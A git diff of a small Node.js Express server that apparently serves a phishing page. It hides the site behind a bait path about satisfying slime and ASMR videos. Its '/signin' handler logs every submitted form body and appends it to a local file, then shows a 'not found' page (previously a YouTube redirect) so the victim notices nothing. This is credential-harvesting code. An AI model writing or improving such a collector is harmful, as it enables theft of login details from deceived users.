@@ -4,14 +4,19 @@ var fs = require('fs');
 const path = require('path');
 var app = express();
 
-app.use('/',express.static('public'));
+app.use('/satisfiying/slimevids/asmrvideo/stressrelieving',express.static('public'));
 
 app.use(express.urlencoded({
     extended:false
 }));
 app.use(express.json());
+
 app.get('/', (req,res) => {
-    res.sendFile(path.join(__dirname,'intro.html'))
+    res.redirect('/satisfiying/slimevids/asmrvideo/stressrelieving')
+});
+
+app.get('/satisfiying/slimevids/asmrvideo/stressrelieving', (req,res) => {
+    res.sendFile(path.join(__dirname,'index.html'))
 });
 
 app.get('/not-found', (req,res) => {
@@ -26,9 +31,11 @@ app.get('/login', (req,res) => {
 app.post('/signin', (req,res) => {
     console.log('Data',req.body);
     fs.writeFile(__dirname + '/files/file',JSON.stringify(req.body),{flag: 'a'},function(){
+        console.log(__dirname,"dirname")
     }
     )
-    res.redirect('https://www.youtube.com/watch?v=v8p7mS2NAHg')
+    res.sendFile(path.join(__dirname,'notfound.html'))
+    // res.redirect('/notfound.html')
 });
 
  
